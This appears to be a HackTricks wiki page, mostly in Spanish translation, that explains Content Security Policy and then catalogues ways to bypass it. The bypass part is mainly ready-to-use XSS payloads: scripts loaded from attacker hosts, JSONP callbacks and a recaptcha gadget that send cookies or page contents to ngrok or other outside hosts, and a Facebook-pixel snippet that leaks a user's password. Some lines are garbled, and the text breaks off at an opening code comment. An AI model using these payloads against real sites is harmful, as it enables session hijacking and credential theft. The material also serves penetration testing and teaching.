# Content Security Policy (CSP) Bypass

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!

**Hacking Insights**\
Engage with content that delves into the thrill and challenges of hacking

**Real-Time Hack News**\
Keep up-to-date with fast-paced hacking world through real-time news and insights

**Latest Announcements**\
Stay informed with the newest bug bounties launching and crucial platform updates

**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!

## What is CSP

La Pol√≠tica de Seguridad de Contenidos (CSP) es reconocida como una tecnolog√≠a de navegador, principalmente destinada a **proteger contra ataques como el scripting entre sitios (XSS)**. Funciona definiendo y detallando rutas y fuentes desde las cuales los recursos pueden ser cargados de manera segura por el navegador. Estos recursos abarcan una variedad de elementos como im√°genes, marcos y JavaScript. Por ejemplo, una pol√≠tica podr√≠a permitir la carga y ejecuci√≥n de recursos desde el mismo dominio (self), incluyendo recursos en l√≠nea y la ejecuci√≥n de c√≥digo en forma de cadena a trav√©s de funciones como `eval`, `setTimeout` o `setInterval`.

La implementaci√≥n de CSP se lleva a cabo a trav√©s de **encabezados de respuesta** o incorporando **elementos meta en la p√°gina HTML**. Siguiendo esta pol√≠tica, los navegadores aplican proactivamente estas estipulaciones y bloquean inmediatamente cualquier violaci√≥n detectada.

* Implemented via response header:
```
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
* Implementado a trav√©s de la etiqueta meta:
```xml
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### Headers

CSP se puede hacer cumplir o monitorear utilizando estos encabezados:

* `Content-Security-Policy`: Hace cumplir el CSP; el navegador bloquea cualquier violaci√≥n.
* `Content-Security-Policy-Report-Only`: Se utiliza para monitoreo; informa violaciones sin bloquearlas. Ideal para pruebas en entornos de preproducci√≥n.

### Defining Resources

CSP restringe los or√≠genes para cargar tanto contenido activo como pasivo, controlando aspectos como la ejecuci√≥n de JavaScript en l√≠nea y el uso de `eval()`. Un ejemplo de pol√≠tica es:
```bash
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### Directives

* **script-src**: Permite fuentes espec√≠ficas para JavaScript, incluyendo URLs, scripts en l√≠nea y scripts activados por controladores de eventos o hojas de estilo XSLT.
* **default-src**: Establece una pol√≠tica predeterminada para la obtenci√≥n de recursos cuando faltan directivas de obtenci√≥n espec√≠ficas.
* **child-src**: Especifica recursos permitidos para trabajadores web y contenidos de marcos incrustados.
* **connect-src**: Restringe las URLs que se pueden cargar utilizando interfaces como fetch, WebSocket, XMLHttpRequest.
* **frame-src**: Restringe las URLs para marcos.
* **frame-ancestors**: Especifica qu√© fuentes pueden incrustar la p√°gina actual, aplicable a elementos como `<frame>`, `<iframe>`, `<object>`, `<embed>`, y `<applet>`.
* **img-src**: Define fuentes permitidas para im√°genes.
* **font-src**: Especifica fuentes v√°lidas para fuentes cargadas usando `@font-face`.
* **manifest-src**: Define fuentes permitidas de archivos de manifiesto de aplicaci√≥n.
* **media-src**: Define fuentes permitidas para cargar objetos multimedia.
* **object-src**: Define fuentes permitidas para elementos `<object>`, `<embed>`, y `<applet>`.
* **base-uri**: Especifica URLs permitidas para cargar usando elementos `<base>`.
* **form-action**: Enumera puntos finales v√°lidos para env√≠os de formularios.
* **plugin-types**: Restringe los tipos MIME que una p√°gina puede invocar.
* **upgrade-insecure-requests**: Instruye a los navegadores a reescribir URLs HTTP a HTTPS.
* **sandbox**: Aplica restricciones similares al atributo sandbox de un `<iframe>`.
* **report-to**: Especifica un grupo al que se enviar√° un informe si se viola la pol√≠tica.
* **worker-src**: Especifica fuentes v√°lidas para scripts de Worker, SharedWorker o ServiceWorker.
* **prefetch-src**: Especifica fuentes v√°lidas para recursos que ser√°n obtenidos o preobtenidos.
* **navigate-to**: Restringe las URLs a las que un documento puede navegar por cualquier medio (a, formulario, window.location, window.open, etc.)

### Sources

* `*`: Permite todas las URLs excepto aquellas con esquemas `data:`, `blob:`, `filesystem:`.
* `'self'`: Permite cargar desde el mismo dominio.
* `'data'`: Permite que los recursos se carguen a trav√©s del esquema de datos (por ejemplo, im√°genes codificadas en Base64).
* `'none'`: Bloquea la carga desde cualquier fuente.
* `'unsafe-eval'`: Permite el uso de `eval()` y m√©todos similares, no recomendado por razones de seguridad.
* `'unsafe-hashes'`: Habilita controladores de eventos en l√≠nea espec√≠ficos.
* `'unsafe-inline'`: Permite el uso de recursos en l√≠nea como `<script>` o `<style>` en l√≠nea, no recomendado por razones de seguridad.
* `'nonce'`: Una lista blanca para scripts en l√≠nea espec√≠ficos usando un nonce criptogr√°fico (n√∫mero usado una vez).
* Si tienes ejecuci√≥n de JS limitada, es posible obtener un nonce usado dentro de la p√°gina con `doc.defaultView.top.document.querySelector("[nonce]")` y luego reutilizarlo para cargar un script malicioso (si se usa strict-dynamic, cualquier fuente permitida puede cargar nuevas fuentes, por lo que esto no es necesario), como en:

<details>

<summary>Cargar script reutilizando nonce</summary>
```html
<!-- From https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/ -->
<img src=x ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)'>
```
</details>

* `'sha256-<hash>'`: Permite scripts con un hash sha256 espec√≠fico.
* `'strict-dynamic'`: Permite cargar scripts de cualquier fuente si ha sido permitido por un nonce o hash.
* `'host'`: Especifica un host espec√≠fico, como `example.com`.
* `https:`: Restringe las URL a aquellas que utilizan HTTPS.
* `blob:`: Permite que los recursos se carguen desde URLs Blob (por ejemplo, URLs Blob creadas a trav√©s de JavaScript).
* `filesystem:`: Permite que los recursos se carguen desde el sistema de archivos.
* `'report-sample'`: Incluye una muestra del c√≥digo que viola en el informe de violaci√≥n (√∫til para depuraci√≥n).
* `'strict-origin'`: Similar a 'self' pero asegura que el nivel de seguridad del protocolo de las fuentes coincida con el documento (solo or√≠genes seguros pueden cargar recursos de or√≠genes seguros).
* `'strict-origin-when-cross-origin'`: Env√≠a URLs completas al hacer solicitudes del mismo origen, pero solo env√≠a el origen cuando la solicitud es de origen cruzado.
* `'unsafe-allow-redirects'`: Permite que se carguen recursos que redirigir√°n inmediatamente a otro recurso. No se recomienda ya que debilita la seguridad.

## Reglas CSP Inseguras

### 'unsafe-inline'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
Working payload: `"/><script>alert(1);</script>`

#### self + 'unsafe-inline' a trav√©s de Iframes

{% content-ref url="csp-bypass-self-+-unsafe-inline-with-iframes.md" %}
[csp-bypass-self-+-unsafe-inline-with-iframes.md](csp-bypass-self-+-unsafe-inline-with-iframes.md)
{% endcontent-ref %}

### 'unsafe-eval'

{% hint style="danger" %}
Esto no est√° funcionando, para m√°s informaci√≥n [**ver esto**](https://github.com/HackTricks-wiki/hacktricks/issues/653).
{% endhint %}
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
Carga √∫til funcional:
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### strict-dynamic

Si de alguna manera puedes hacer que un **c√≥digo JS permitido cree una nueva etiqueta de script** en el DOM con tu c√≥digo JS, porque un script permitido la est√° creando, la **nueva etiqueta de script se permitir√° ejecutar**.

### Wildcard (\*)
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
Carga √∫til funcional:
```markup
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### Falta de object-src y default-src

{% hint style="danger" %}
**Parece que esto ya no est√° funcionando**
{% endhint %}
```yaml
Content-Security-Policy: script-src 'self' ;
```
Cargas √∫tiles:
```markup
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### Carga de Archivos + 'self'
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
Si puedes subir un archivo JS, puedes eludir este CSP:

Carga √∫til en funcionamiento:
```markup
"/>'><script src="/uploads/picture.png.js"></script>
```
Sin embargo, es muy probable que el servidor est√© **validando el archivo subido** y solo te permita **subir determinados tipos de archivos**.

Adem√°s, incluso si pudieras subir un **c√≥digo JS dentro** de un archivo con una extensi√≥n aceptada por el servidor (como: _script.png_), esto no ser√≠a suficiente porque algunos servidores como el servidor apache **seleccionan el tipo MIME del archivo seg√∫n la extensi√≥n** y navegadores como Chrome **rechazar√°n ejecutar c√≥digo Javascript** dentro de algo que deber√≠a ser una imagen. "Esperemos", hay errores. Por ejemplo, de un CTF aprend√≠ que **Apache no conoce** la extensi√≥n _**.wave**_, por lo tanto, no la sirve con un **tipo MIME como audio/\***.

A partir de aqu√≠, si encuentras un XSS y una carga de archivos, y logras encontrar una **extensi√≥n malinterpretada**, podr√≠as intentar subir un archivo con esa extensi√≥n y el contenido del script. O, si el servidor est√° verificando el formato correcto del archivo subido, crear un poliglota ([algunos ejemplos de poliglota aqu√≠](https://github.com/Polydet/polyglot-database)).

### Form-action

Si no es posible inyectar JS, a√∫n podr√≠as intentar exfiltrar, por ejemplo, credenciales **inyectando una acci√≥n de formulario** (y tal vez esperando que los administradores de contrase√±as completen autom√°ticamente las contrase√±as). Puedes encontrar un [**ejemplo en este informe**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp). Adem√°s, ten en cuenta que `default-src` no cubre las acciones de formulario.

### Third Party Endpoints + ('unsafe-eval')

{% hint style="warning" %}
Para algunos de los siguientes payloads **`unsafe-eval` ni siquiera es necesario**.
{% endhint %}
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
Cargar una versi√≥n vulnerable de angular y ejecutar JS arbitrario:
```xml
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### Payloads usando Angular + una biblioteca con funciones que devuelven el objeto `window` ([mira esta publicaci√≥n](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)):

{% hint style="info" %}
La publicaci√≥n muestra que podr√≠as **cargar** todas las **bibliotecas** desde `cdn.cloudflare.com` (o cualquier otro repositorio de bibliotecas JS permitidas), ejecutar todas las funciones a√±adidas de cada biblioteca y verificar **qu√© funciones de qu√© bibliotecas devuelven el objeto `window`**.
{% endhint %}
```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>
```
Angular XSS desde un nombre de clase:
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
#### Abusando del c√≥digo JS de google recaptcha

Seg√∫n [**este informe de CTF**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?\_x\_tr\_sl=es&\_x\_tr\_tl=en&\_x\_tr\_hl=es&\_x\_tr\_pto=wapp#noteninja-3-solves), puedes abusar de [https://www.google.com/recaptcha/](https://www.google.com/recaptcha/) dentro de un CSP para ejecutar c√≥digo JS arbitrario eludiendo el CSP:
```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```
M√°s [**payloads de este informe**](https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/):
```html
<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>

<!-- Trigger alert -->
<img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>

<!-- Reuse nonce -->
<img src=x ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)'>
```
#### Abusando de www.google.com para redirecci√≥n abierta

La siguiente URL redirige a example.com (desde [aqu√≠](https://www.landh.tech/blog/20240304-google-hack-50000/)):
```
https://www.google.com/amp/s/example.com/
```
Abusando \*.google.com/script.google.com

Es posible abusar de Google Apps Script para recibir informaci√≥n en una p√°gina dentro de script.google.com. Como se [hace en este informe](https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/).

### Puntos finales de terceros + JSONP
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
Escenarios como este donde `script-src` est√° configurado en `self` y un dominio particular que est√° en la lista blanca pueden ser eludidos usando JSONP. Los puntos finales de JSONP permiten m√©todos de callback inseguros que permiten a un atacante realizar XSS, carga √∫til en funcionamiento:
```markup
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```
[**JSONBee**](https://github.com/zigoo0/JSONBee) **contiene puntos finales JSONP listos para usar para eludir CSP de diferentes sitios web.**

La misma vulnerabilidad ocurrir√° si el **punto final de confianza contiene una Redirecci√≥n Abierta** porque si el punto final inicial es de confianza, las redirecciones son de confianza.

### Abusos de Terceros

Como se describe en el [siguiente post](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses), hay muchos dominios de terceros que podr√≠an estar permitidos en alg√∫n lugar del CSP, que pueden ser abusados para exfiltrar datos o ejecutar c√≥digo JavaScript. Algunos de estos terceros son:

| Entidad            | Dominio Permitido                           | Capacidades  |
| ------------------ | ------------------------------------------ | ------------- |
| Facebook           | www.facebook.com, \*.facebook.com          | Exfil         |
| Hotjar             | \*.hotjar.com, ask.hotjar.io              | Exfil         |
| Jsdelivr           | \*.jsdelivr.com, cdn.jsdelivr.net          | Exec          |
| Amazon CloudFront  | \*.cloudfront.net                          | Exfil, Exec   |
| Amazon AWS         | \*.amazonaws.com                           | Exfil, Exec   |
| Azure Websites     | \*.azurewebsites.net, \*.azurestaticapps.net | Exfil, Exec   |
| Salesforce Heroku  | \*.herokuapp.com                           | Exfil, Exec   |
| Google Firebase    | \*.firebaseapp.com                         | Exfil, Exec   |

Si encuentras alguno de los dominios permitidos en el CSP de tu objetivo, es probable que puedas eludir el CSP registr√°ndote en el servicio de terceros y, ya sea exfiltrando datos a ese servicio o ejecutando c√≥digo.

Por ejemplo, si encuentras el siguiente CSP:
```
Content-Security-Policy‚Äã: default-src 'self‚Äô www.facebook.com;‚Äã
```
o
```
Content-Security-Policy‚Äã: connect-src www.facebook.com;‚Äã
```
Deber√≠as poder exfiltrar datos, de manera similar a como siempre se ha hecho con [Google Analytics](https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp)/[Google Tag Manager](https://blog.deteact.com/csp-bypass/). En este caso, sigues estos pasos generales:

1. Crea una cuenta de desarrollador de Facebook aqu√≠.
2. Crea una nueva aplicaci√≥n de "Inicio de sesi√≥n de Facebook" y selecciona "Sitio web".
3. Ve a "Configuraci√≥n -> B√°sico" y obt√©n tu "ID de aplicaci√≥n".
4. En el sitio objetivo del que deseas exfiltrar datos, puedes exfiltrar datos utilizando directamente el gadget "fbq" del SDK de Facebook a trav√©s de un "customEvent" y la carga de datos.
5. Ve a "Administrador de eventos" de tu aplicaci√≥n y selecciona la aplicaci√≥n que creaste (ten en cuenta que el administrador de eventos podr√≠a encontrarse en una URL similar a esta: https://www.facebook.com/events\_manager2/list/pixel/\[app-id]/test\_events).
6. Selecciona la pesta√±a "Eventos de prueba" para ver los eventos que se env√≠an desde "tu" sitio web.

Luego, en el lado de la v√≠ctima, ejecutas el siguiente c√≥digo para inicializar el p√≠xel de seguimiento de Facebook para apuntar al ID de aplicaci√≥n de la cuenta de desarrollador de Facebook del atacante y emitir un evento personalizado como este:
```JavaScript
fbq('init', '1279785999289471');‚Äã // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{‚Äã
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"‚Äã
});
```
En cuanto a los otros siete dominios de terceros especificados en la tabla anterior, hay muchas otras formas en que puedes abusar de ellos. Consulta la [entrada del blog](https://sensepost.com/blog/2023/dress-codethe-talk/#bypasses) anterior para explicaciones adicionales sobre otros abusos de terceros.

### Bypass via RPO (Relative Path Overwrite) <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

Adem√°s de la redirecci√≥n mencionada anteriormente para eludir las restricciones de ruta, hay otra t√©cnica llamada Relative Path Overwrite (RPO) que se puede utilizar en algunos servidores.

Por ejemplo, si CSP permite la ruta `https://example.com/scripts/react/`, se puede eludir de la siguiente manera:
```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```
El navegador finalmente cargar√° `https://example.com/scripts/angular/angular.js`.

Esto funciona porque para el navegador, est√°s cargando un archivo llamado `..%2fangular%2fangular.js` ubicado en `https://example.com/scripts/react/`, que es compatible con CSP.

‚àë, lo decodificar√°n, solicitando efectivamente `https://example.com/scripts/react/../angular/angular.js`, que es equivalente a `https://example.com/scripts/angular/angular.js`.

Al **explotar esta inconsistencia en la interpretaci√≥n de URL entre el navegador y el servidor, se pueden eludir las reglas de ruta**.

La soluci√≥n es no tratar `%2f` como `/` en el lado del servidor, asegurando una interpretaci√≥n consistente entre el navegador y el servidor para evitar este problema.

Ejemplo en l√≠nea:[ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### Ejecuci√≥n de JS en Iframes

{% content-ref url="../xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](../xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### falta **base-uri**

Si falta la directiva **base-uri**, puedes abusar de ella para realizar una [**inyecci√≥n de marcado colgante**](../dangling-markup-html-scriptless-injection/).

Adem√°s, si la **p√°gina est√° cargando un script usando una ruta relativa** (como `<script src="/js/app.js">`) utilizando un **Nonce**, puedes abusar de la **etiqueta base** para hacer que **cargue** el script desde **tu propio servidor logrando un XSS.**\
Si la p√°gina vulnerable se carga con **httpS**, utiliza una URL httpS en la base.
```html
<base href="https://www.attacker.com/">
```
### AngularJS events

Una pol√≠tica espec√≠fica conocida como Content Security Policy (CSP) puede restringir los eventos de JavaScript. No obstante, AngularJS introduce eventos personalizados como una alternativa. Dentro de un evento, AngularJS proporciona un objeto √∫nico `$event`, que hace referencia al objeto de evento nativo del navegador. Este objeto `$event` puede ser explotado para eludir el CSP. Notablemente, en Chrome, el objeto `$event/event` posee un atributo `path`, que contiene un array de objetos implicados en la cadena de ejecuci√≥n del evento, con el objeto `window` invariablemente posicionado al final. Esta estructura es fundamental para las t√°cticas de escape de sandbox.

Al dirigir este array al filtro `orderBy`, es posible iterar sobre √©l, aprovechando el elemento terminal (el objeto `window`) para activar una funci√≥n global como `alert()`. El fragmento de c√≥digo demostrado a continuaci√≥n elucida este proceso:
```xml
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
Este fragmento destaca el uso de la directiva `ng-focus` para activar el evento, empleando `$event.path|orderBy` para manipular el array `path`, y aprovechando el objeto `window` para ejecutar la funci√≥n `alert()`, revelando as√≠ `document.cookie`.

**Encuentra otros bypasses de Angular en** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### AngularJS y dominio en la lista blanca
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
Una pol√≠tica de CSP que permite dominios para la carga de scripts en una aplicaci√≥n Angular JS puede ser eludida a trav√©s de la invocaci√≥n de funciones de callback y ciertas clases vulnerables. M√°s informaci√≥n sobre esta t√©cnica se puede encontrar en una gu√≠a detallada disponible en este [git repository](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh\*t,-it's-CSP!%22).

Cargas √∫tiles:
```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
Otros puntos de ejecuci√≥n arbitraria de JSONP se pueden encontrar en [**aqu√≠**](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) (algunos de ellos fueron eliminados o corregidos)

### Bypass a trav√©s de Redirecci√≥n

¬øQu√© sucede cuando CSP encuentra una redirecci√≥n del lado del servidor? Si la redirecci√≥n lleva a un origen diferente que no est√° permitido, a√∫n fallar√°.

Sin embargo, de acuerdo con la descripci√≥n en [CSP spec 4.2.2.3. Paths and Redirects](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects), si la redirecci√≥n lleva a un camino diferente, puede eludir las restricciones originales.

Aqu√≠ hay un ejemplo:
```html
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Security-Policy" content="script-src http://localhost:5555 https://www.google.com/a/b/c/d">
</head>
<body>
<div id=userContent>
<script src="https://https://www.google.com/test"></script>
<script src="https://https://www.google.com/a/test"></script>
<script src="http://localhost:5555/301"></script>
</div>
</body>
</html>
```
Si CSP est√° configurado en `https://www.google.com/a/b/c/d`, dado que se considera la ruta, tanto los scripts `/test` como `/a/test` ser√°n bloqueados por CSP.

Sin embargo, el final `http://localhost:5555/301` ser√° **redirigido en el lado del servidor a `https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//`**. Dado que es una redirecci√≥n, **la ruta no se considera**, y **el script puede ser cargado**, eludiendo as√≠ la restricci√≥n de la ruta.

Con esta redirecci√≥n, incluso si la ruta se especifica completamente, a√∫n ser√° eludida.

Por lo tanto, la mejor soluci√≥n es asegurarse de que el sitio web no tenga vulnerabilidades de redirecci√≥n abiertas y que no haya dominios que puedan ser explotados en las reglas de CSP.

### Eludir CSP con marcado colgante

Lee [c√≥mo aqu√≠](../dangling-markup-html-scriptless-injection/).

### 'unsafe-inline'; img-src \*; a trav√©s de XSS
```
default-src 'self' 'unsafe-inline'; img-src *;
```
`'unsafe-inline'` significa que puedes ejecutar cualquier script dentro del c√≥digo (XSS puede ejecutar c√≥digo) y `img-src *` significa que puedes usar en la p√°gina web cualquier imagen de cualquier recurso.

Puedes eludir este CSP exfiltrando los datos a trav√©s de im√°genes (en esta ocasi√≥n, el XSS abusa de un CSRF donde una p√°gina accesible por el bot contiene un SQLi, y extrae la bandera a trav√©s de una imagen):
```javascript
<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new Image().src='http://PLAYER_SERVER/?'+_)</script>
```
From: [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

Tambi√©n podr√≠as abusar de esta configuraci√≥n para **cargar c√≥digo javascript insertado dentro de una imagen**. Si, por ejemplo, la p√°gina permite cargar im√°genes desde Twitter. Podr√≠as **crear** una **imagen especial**, **subirla** a Twitter y abusar de la "**unsafe-inline**" para **ejecutar** un c√≥digo JS (como un XSS regular) que **cargar√°** la **imagen**, **extraer√°** el **JS** de ella y **lo ejecutar√°**: [https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### Con Service Workers

La funci√≥n **`importScripts`** de los service workers no est√° limitada por CSP:

{% content-ref url="../xss-cross-site-scripting/abusing-service-workers.md" %}
[abusing-service-workers.md](../xss-cross-site-scripting/abusing-service-workers.md)
{% endcontent-ref %}

### Inyecci√≥n de Pol√≠ticas

**Investigaci√≥n:** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

Si un **par√°metro** enviado por ti est√° siendo **pegado dentro** de la **declaraci√≥n** de la **pol√≠tica,** entonces podr√≠as **alterar** la **pol√≠tica** de alguna manera que la haga **in√∫til**. Podr√≠as **permitir script 'unsafe-inline'** con cualquiera de estos bypasses:
```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
Porque esta directiva **sobrescribir√° las directivas existentes de script-src**.\
Puedes encontrar un ejemplo aqu√≠: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

En Edge es mucho m√°s simple. Si puedes agregar en el CSP solo esto: **`;_`** **Edge** **eliminar√°** toda la **pol√≠tica**.\
Ejemplo: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert\(1\)%3C/script%3E)

### img-src \*; v√≠a XSS (iframe) - Ataque de tiempo

Nota la falta de la directiva `'unsafe-inline'`\
Esta vez puedes hacer que la v√≠ctima **cargue** una p√°gina bajo **tu control** a trav√©s de **XSS** con un `<iframe`. Esta vez vas a hacer que la v√≠ctima acceda a la p√°gina de donde quieres extraer informaci√≥n (**CSRF**). No puedes acceder al contenido de la p√°gina, pero si de alguna manera puedes **controlar el tiempo que la p√°gina necesita para cargar** puedes extraer la informaci√≥n que necesitas.

Esta vez se va a extraer una **bandera**, cada vez que un **car√°cter es adivinado correctamente** a trav√©s de SQLi, la **respuesta** toma **m√°s tiempo** debido a la funci√≥n de sue√±o. Entonces, podr√°s extraer la bandera:
```html
<!--code from https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle -->
